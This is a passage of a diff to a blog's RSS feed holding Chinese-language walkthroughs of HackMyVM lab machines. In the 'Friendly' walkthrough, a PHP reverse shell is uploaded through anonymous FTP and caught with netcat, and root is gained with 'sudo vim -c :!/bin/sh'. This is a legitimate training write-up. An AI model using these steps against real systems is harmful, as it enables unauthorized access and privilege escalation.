+‍&lt;!-- ##{'timestamp':1739012133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_hannah.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_uvalde</title><link>https://7r1UMPH.github.io/post/hmv_uvalde.html</link><description># 0.简介
 
 靶机：https://hackmyvm.eu/machines/machine.php?vm=Uvalde
  难度：绿色
@@ -5568,7 +9648,71 @@ Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
 
 ![image-20250331185843031](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185843370.png)
 
-有个上传页/service.html，上传个马看看。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_w140.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>panghu</title><link>https://7r1UMPH.github.io/post/panghu.html</link><description>裙u的提权题
+有个上传页/service.html，上传个马看看。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_w140.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_Medusa</title><link>https://7r1UMPH.github.io/post/hmv_Medusa.html</link><description># 0.简介
+
+靶机：https://hackmyvm.eu/machines/?v=Medusa
+ 难度：绿色
+ 目标 IP：192.168.205.145
+ 本机 IP：192.168.205.128
+
+# 1.扫描
+
+nmap起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.145
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 0.00% done
+Nmap scan report for 192.168.205.145
+Host is up (0.00026s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
+|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
+|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:5D:E9:45 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms 192.168.205.145
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
+                                                           
+```
+
+# 2.踩点
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ ftp 192.168.205.145
+Connected to 192.168.205.145.
+220 (vsFTPd 3.0.3)
+Name (192.168.205.145:kali): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; 
+ftp&gt; exit
+221 Goodbye.
+```
+
+不许登，那去看80。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Medusa.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>panghu</title><link>https://7r1UMPH.github.io/post/panghu.html</link><description>裙u的提权题
 
 ![image-20250331190451295](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190451337.png)
 
@@ -5832,7 +9976,155 @@ jan:~# id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-&lt;!-- ##{'timestamp':1738666533}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPH.github.io/post/Listen.html</link><description># 0.简介
+&lt;!-- ##{'timestamp':1738666533}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/panghu.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPH.github.io/post/hmv_friendly.html</link><description># 0.简介
+
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
+ 难度：绿色
+ 目标 IP：192.168.205.129
+ 本机 IP：192.168.205.128
+
+# 1.扫描
+
+nmap起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
+Nmap scan report for 192.168.205.129
+Host is up (0.00059s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
+```
+
+# 2.踩点
+
+先进行ftp匿名登录
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ ftp 192.168.205.129
+Connected to 192.168.205.129.
+220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
+Name (192.168.205.129:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||17885|)
+150 Opening ASCII mode data connection for file list
+drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
+drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
+-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
+```
+
+和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
+
+```
+ftp&gt; put php.php 
+local: php.php remote: php.php
+229 Entering Extended Passive Mode (|||22559|)
+150 Opening BINARY mode data connection for php.php
+100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
+226 Transfer complete
+2596 bytes sent in 00:00 (241.58 KiB/s)
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||7798|)
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
+-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
+226 Transfer complete
+```
+
+访问
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
+Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
+ 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (439): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+# 3. 获得稳定的 Shell
+
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```
+www-data@friendly:/$ ls -la
+total 68
+drwxr-xr-x  18 root root  4096 Mar 11  2023 .
+drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
+lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
+drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
+drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
+drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
+drwxr-xr-x   3 root root  4096 Feb 21  2023 home
+lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
+lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
+lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
+lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
+drwx------   2 root root 16384 Feb 21  2023 lost+found
+drwxr-xr-x   3 root root  4096 Feb 21  2023 media
+drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
+drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
+dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
+drwx------   3 root root  4096 Mar 11  2023 root
+drwxr-xr-x  17 root root   540 Feb  2 23:26 run
+lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
+drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
+dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
+drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
+drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
+drwxr-xr-x  12 root root  4096 Feb 21  2023 var
+lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
+lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
+www-data@friendly:/$ sudo -l
+Matching Defaults entries for www-data on friendly:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on friendly:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+```
+
+![image-20250331191435274](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png)
+
+🔗https://gtfobins.github.io/gtfobins/vim/#sudo
+
+```
+www-data@friendly:/$ sudo vim -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+&lt;!-- ##{'timestamp':1738580133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Listen</title><link>https://7r1UMPH.github.io/post/Listen.html</link><description># 0.简介
 
 这是一个群友的靶机，我不知道他发不发布，所以就看看吧，学习学习
 
@@ -5935,4 +10227,6 @@ by Ben 'epi' Risher 🤓                 ver: 2.11.0
                                                                                                                                     
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.137/README.md
-2025年1月22日　本プロジェクトの開発は一旦ここで終了です。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/Listen.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>关于</title><link>https://7r1UMPH.github.io/about.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umph.top/plugins/AboutMe.js'&gt;&lt;/script&gt;'}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/about.html</guid><pubDate>Thu, 20 Mar 2025 13:25:46 +0000</pubDate></item><item><title>友链</title><link>https://7r1UMPH.github.io/link.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umph.top/plugins/FriendLinks.js'&gt;&lt;/script&gt;'}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/link.html</guid><pubDate>Thu, 20 Mar 2025 13:26:17 +0000</pubDate></item></channel></rss>
+2025年1月22日　本プロジェクトの開発は一旦ここで終了です。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/Listen.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>新年快乐！</title><link>https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># 新年快乐！
+
+新的一年，愿你如东风破浪，事业蒸蒸日上，生活美满如意。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Wed, 29 Jan 2025 07:38:41 +0000</pubDate></item><item><title>关于</title><link>https://7r1UMPH.github.io/about.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umph.top/plugins/AboutMe.js'&gt;&lt;/script&gt;'}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/about.html</guid><pubDate>Thu, 20 Mar 2025 13:25:46 +0000</pubDate></item><item><title>友链</title><link>https://7r1UMPH.github.io/link.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umph.top/plugins/FriendLinks.js'&gt;&lt;/script&gt;'}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/link.html</guid><pubDate>Thu, 20 Mar 2025 13:26:17 +0000</pubDate></item></channel></rss>
